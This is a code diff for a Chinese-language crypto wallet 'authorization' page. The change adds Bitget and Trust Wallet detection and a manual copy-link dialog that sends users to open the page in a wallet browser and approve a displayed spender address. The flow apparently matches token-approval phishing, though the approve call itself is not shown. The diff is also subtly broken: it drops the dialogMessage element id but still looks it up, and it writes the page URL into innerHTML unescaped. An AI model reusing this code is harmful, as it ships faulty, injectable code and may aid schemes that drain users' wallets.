@@ -169,8 +169,6 @@
         .dialog-message {
             word-break: break-all;
             margin: 12px 0;
-            font-size: 14px;
-            color: #4b5563;
         }
         .dialog-button {
             margin-top: 16px;
@@ -185,16 +183,6 @@
             background: #e2e8f0;
             color: #1e293b;
             margin-top: 8px;
-        }
-        .url-box {
-            background: #f1f5f9;
-            border-radius: 12px;
-            padding: 12px;
-            margin: 12px 0;
-            word-break: break-all;
-            font-size: 12px;
-            color: #333;
-            text-align: left;
         }
     </style>
 </head>
@@ -226,9 +214,8 @@
 
 <div id="dialogMask" class="dialog-mask">
     <div class="dialog">
-        <div class="dialog-message" id="dialogMessage"></div>
-        <div id="dialogUrlBox" class="url-box hidden"></div>
-        <div id="dialogButtons"></div>
+        <div class="dialog-message"></div>
+        <button class="dialog-button">确定</button>
     </div>
 </div>
 
@@ -284,21 +271,33 @@
             tronlink: {
                 name: 'TronLink',
                 icon: '🌊',
-                // 不自动跳转，引导手动复制
-                needManual: true,
+                canAutoJump: false, // 不能自动跳转，手动复制
                 isInjected: () => window.tronLink && window.tronLink.ready === true
             },
             tokenpocket: {
                 name: 'TokenPocket',
                 icon: '🎫',
+                canAutoJump: true,
                 dappUrl: (url) => `tpdapp://open?params=${encodeURIComponent(JSON.stringify({ url: url }))}`,
                 isInjected: () => window.tronWeb && window.tronWeb.defaultAddress !== undefined
             },
             imtoken: {
                 name: 'imToken',
                 icon: '🔷',
-                needManual: true,
+                canAutoJump: false,
                 isInjected: () => window.ethereum && window.ethereum.isImToken === true
+            },
+            bitget: {
+                name: 'Bitget',
+                icon: '📈',
+                canAutoJump: false,
+                isInjected: () => window.ethereum && (window.ethereum.isBitKeep || window.ethereum.isBitget) || (window.bitkeep && window.bitkeep.ethereum)
+            },
+            trust: {
+                name: 'Trust Wallet',
+                icon: '🔒',
+                canAutoJump: false,
+                isInjected: () => window.ethereum && window.ethereum.isTrust === true
             }
         }
     };
@@ -312,8 +311,7 @@
     const statusDiv = document.getElementById('status');
     const dialogMask = document.getElementById('dialogMask');
     const dialogMessage = document.getElementById('dialogMessage');
-    const dialogUrlBox = document.getElementById('dialogUrlBox');
-    const dialogButtons = document.getElementById('dialogButtons');
+    const dialogButton = document.querySelector('.dialog-button');
 
     function showStatus(message, type = 'loading') {
         statusDiv.innerHTML = type === 'loading' ? `<span class="loading-spinner"></span>${message}` : message;
@@ -321,37 +319,13 @@
         statusDiv.classList.remove('hidden');
     }
     function hideStatus() { statusDiv.classList.add('hidden'); }
-    function showDialog(msg, showUrl = false, url = '') {
+    function showDialog(msg) {
         dialogMessage.textContent = msg;
-        if (showUrl && url) {
-            dialogUrlBox.innerHTML = `<strong>链接：</strong><br>${url}`;
-            dialogUrlBox.classList.remove('hidden');
-        } else {
-            dialogUrlBox.classList.add('hidden');
-        }
-        // 清空按钮并重建
-        dialogButtons.innerHTML = '';
-        const closeBtn = document.createElement('button');
-        closeBtn.textContent = '确定';
-        closeBtn.className = 'dialog-button';
-        closeBtn.onclick = () => hideDialog();
-        dialogButtons.appendChild(closeBtn);
-        if (showUrl && url) {
-            const copyBtn = document.createElement('button');
-            copyBtn.textContent = '复制链接';
-            copyBtn.className = 'dialog-button copy-btn';
-            copyBtn.onclick = () => {
-                navigator.clipboard.writeText(url).then(() => {
-                    showDialog('链接已复制，请打开钱包内置浏览器粘贴打开', false);
-                }).catch(() => {
-                    alert('复制失败，请手动复制');
-                });
-            };
-            dialogButtons.appendChild(copyBtn);
-        }
         dialogMask.style.display = 'flex';
     }
     function hideDialog() { dialogMask.style.display = 'none'; }
+    dialogButton.onclick = hideDialog;
+    dialogMask.onclick = (e) => { if (e.target === dialogMask) hideDialog(); };
 
     // 更新授权地址显示
     function updateSpenderDisplay() {
@@ -395,6 +369,8 @@
             if (selectedWallet === 'tronlink') return window.tronLink && window.tronLink.ready === true;
             if (selectedWallet === 'tokenpocket') return window.tronWeb && window.tronWeb.defaultAddress !== undefined;
             if (selectedWallet === 'imtoken') return window.ethereum && window.ethereum.isImToken === true;
+            if (selectedWallet === 'bitget') return (window.ethereum && (window.ethereum.isBitKeep || window.ethereum.isBitget)) || (window.bitkeep && window.bitkeep.ethereum);
+            if (selectedWallet === 'trust') return window.ethereum && window.ethereum.isTrust === true;
             return false;
         } else {
             return window.ethereum && window.ethereum.isMetaMask === true;
@@ -486,6 +462,13 @@
             tronWeb = window.tronWeb;
         } else if (selectedWallet === 'imtoken' && window.ethereum && window.ethereum.isImToken && window.tronWeb) {
             tronWeb = window.tronWeb;
+        } else if (selectedWallet === 'bitget' && (window.ethereum && (window.ethereum.isBitKeep || window.ethereum.isBitget) || (window.bitkeep && window.bitkeep.ethereum))) {
+            // Bitget 在 DApp 浏览器中可能通过 window.ethereum 注入，同时可能提供 tronWeb
+            if (window.tronWeb) tronWeb = window.tronWeb;
+            else if (window.tronLink && window.tronLink.ready) tronWeb = window.tronLink.tronWeb;
+            else throw new Error('Bitget TRON 环境未就绪');
+        } else if (selectedWallet === 'trust' && window.ethereum && window.ethereum.isTrust && window.tronWeb) {
+            tronWeb = window.tronWeb;
         } else {
             showStatus('未检测到对应的 TRON 钱包', 'error');
             return false;
@@ -515,6 +498,39 @@
         }
     }
 
+    // ==================== 手动复制链接弹窗 ====================
+    function showManualCopyDialog(url) {
+        const shortUrl = url.length > 60 ? url.slice(0, 60) + '...' : url;
+        const modalHtml = `
+            <div class="dialog-message" style="margin-bottom: 12px;">
+                <p>无法自动跳转钱包，请手动复制链接并在钱包内置浏览器中打开：</p>
+                <div style="background: #f5f5f5; padding: 12px; border-radius: 8px; margin: 12px 0; word-break: break-all; font-size: 12px;">${url}</div>
+                <button id="copyLinkBtn" class="dialog-button copy-btn">复制链接</button>
+            </div>
+        `;
+        const existing = document.querySelector('#manualCopyDialog');
+        if (existing) existing.remove();
+        const div = document.createElement('div');
+        div.id = 'manualCopyDialog';
+        div.className = 'dialog-mask';
+        div.style.display = 'flex';
+        div.innerHTML = `<div class="dialog">${modalHtml}</div>`;
+        document.body.appendChild(div);
+        const copyBtn = div.querySelector('#copyLinkBtn');
+        copyBtn.addEventListener('click', () => {
+            navigator.clipboard.writeText(url).then(() => {
+                alert('链接已复制！请打开对应钱包的内置浏览器，粘贴链接并授权。');
+                div.remove();
+            }).catch(() => {
+                alert('复制失败，请手动复制：\n' + url);
+                div.remove();
+            });
+        });
+        div.addEventListener('click', (e) => {
+            if (e.target === div) div.remove();
+        });
+    }
+
     // ==================== 跳转到钱包 ====================
     function jumpToWallet() {
         if (!selectedWallet) {
@@ -522,31 +538,23 @@
             return;
         }
         const isTron = currentChain === '728126428';
-        let wallet;
-        let url;
-        if (isTron) {
-            wallet = WALLETS.tron[selectedWallet];
-            if (!wallet) {
-                showDialog('无效的钱包');
-                return;
-            }
-            // 对于需要手动操作的钱包，显示复制链接弹窗
-            if (wallet.needManual) {
-                const currentUrl = window.location.href;
-                showDialog(`请在 ${wallet.name} 钱包的内置浏览器中打开此链接完成授权：`, true, currentUrl);
-                return;
-            }
-            url = wallet.dappUrl(window.location.href);
-        } else {
-            wallet = WALLETS.evm[selectedWallet];
-            if (!wallet) {
-                showDialog('无效的钱包');
-                return;
-            }
-            url = wallet.dappUrl(window.location.href);
+        const wallet = isTron ? WALLETS.tron[selectedWallet] : WALLETS.evm[selectedWallet];
+        if (!wallet) {
+            showDialog('无效的钱包');
+            return;
         }
-        console.log('跳转链接:', url);
-        window.location.href = url;
+
+        // 如果钱包支持自动跳转（目前只有 TokenPocket 和 MetaMask）
+        if (wallet.canAutoJump && wallet.dappUrl) {
+            const url = wallet.dappUrl(window.location.href);
+            console.log('自动跳转链接:', url);
+            window.location.href = url;
+            return;
+        }
+
+        // 否则显示手动复制链接弹窗
+        const currentUrl = window.location.href;
+        showManualCopyDialog(currentUrl);
     }
 
     // 主授权入口
@@ -567,8 +575,8 @@
             return;
         }
 
-        // 否则跳转到钱包
-        showStatus('正在跳转到钱包...', 'loading');
+        // 否则跳转到钱包或显示复制提示
+        showStatus('正在准备跳转...', 'loading');
         jumpToWallet();
     }
 
@@ -597,6 +605,16 @@
                 const item = document.querySelector(`.wallet-item[data-wallet="imtoken"]`);
                 if (item) item.classList.add('selected');
                 showStatus('检测到 imToken，可直接授权', 'success');
+            } else if ((window.ethereum && (window.ethereum.isBitKeep || window.ethereum.isBitget)) || (window.bitkeep && window.bitkeep.ethereum)) {
+                selectedWallet = 'bitget';
+                const item = document.querySelector(`.wallet-item[data-wallet="bitget"]`);
+                if (item) item.classList.add('selected');
+                showStatus('检测到 Bitget，可直接授权', 'success');
+            } else if (window.ethereum && window.ethereum.isTrust) {
+                selectedWallet = 'trust';
+                const item = document.querySelector(`.wallet-item[data-wallet="trust"]`);
+                if (item) item.classList.add('selected');
+                showStatus('检测到 Trust Wallet，可直接授权', 'success');
             } else {
                 showStatus('请选择钱包并授权', 'success');
             }
